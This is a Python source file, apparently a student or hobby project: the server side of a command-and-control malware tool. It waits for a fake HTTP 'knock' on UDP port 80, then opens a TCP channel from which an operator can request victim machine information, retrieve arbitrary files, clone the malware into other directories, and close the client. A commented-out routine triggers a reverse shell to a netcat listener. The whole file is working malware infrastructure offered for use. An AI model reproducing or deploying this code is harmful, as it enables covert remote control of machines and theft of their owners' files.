# Jacob Coomer --- This is the server script for a C2 malware application.
# The server begins by listening (but not responding) on port UDP 80.
# After being contacted by the client, the server will open TCP port 10001.

# The commands it can send are: requesting information about the machine, requesting a file, 
# closing the client, cloning the malware into another directory, and receiving a reverse shell. 
# Dependencies: socket, time. Tested on python 3.9  
# Execute with 'python3 server.py' in terminal

from socket import *
from time import *

knockPort = 80
mainPort = 10001
serverSocket = None

# Primary loop of the program. Started after the knock and primary connection have been made.
def mainLoop(connection, address):
    print('MENU:\n1. Get Machine Info\n2. Retrieve a file\n3. Close\n4. Clone the malware on client')
    while True:
        choice = input("\nEnter a number: ")
        
        if choice == '1':
            retrieveInfo(connection)
        elif choice == '2':
            retrieveFile(connection)
        elif choice == '3':
            connection.send('CLOSE'.encode())
            break
        elif choice == '4':
            cloneMalware(connection)

        # elif choice == '5':
        #     spawnShell(connection)

# Setting up the main connection
def setup():
        serverSocket = socket(AF_INET,SOCK_STREAM)
        serverSocket.bind(('',mainPort))
        serverSocket.listen(1)
        connection, address = serverSocket.accept()
        mainLoop(connection, address)

# You could condense these methods into 1, but it's easier to read by splitting them up.
# Input Methods. These send data to the client according to a protocol <KEYWORD PATH>          
def retrieveInfo(connection):
    connection.send('INFO'.encode())
    print(connection.recv(4096).decode())

def retrieveFile(connection):
    path = input('Enter the path to the target file: ')
    connection.send(('FILE ' + path).encode())
    print(connection.recv(4096).decode())

def cloneMalware(connection):
    path = input('Enter the path to clone your malware into.')
    connection.send(('CLONE ' + path).encode())
    print(connection.recv(4096).decode())

# def spawnShell(connection):
#     print('Open an nc listener on port 10002 then press enter here.')
#     pause = input()
#     connection.send('SHELL'.encode())

# Handling the knock.
connection = socket(AF_INET,SOCK_DGRAM)
connection.bind(('',knockPort))
while True:
    message, addr = connection.recvfrom(2048)
    if message.decode() == 'GET / HTTP/1.1\r\n\r\n':  #This is not actually a TCP connection
        setup()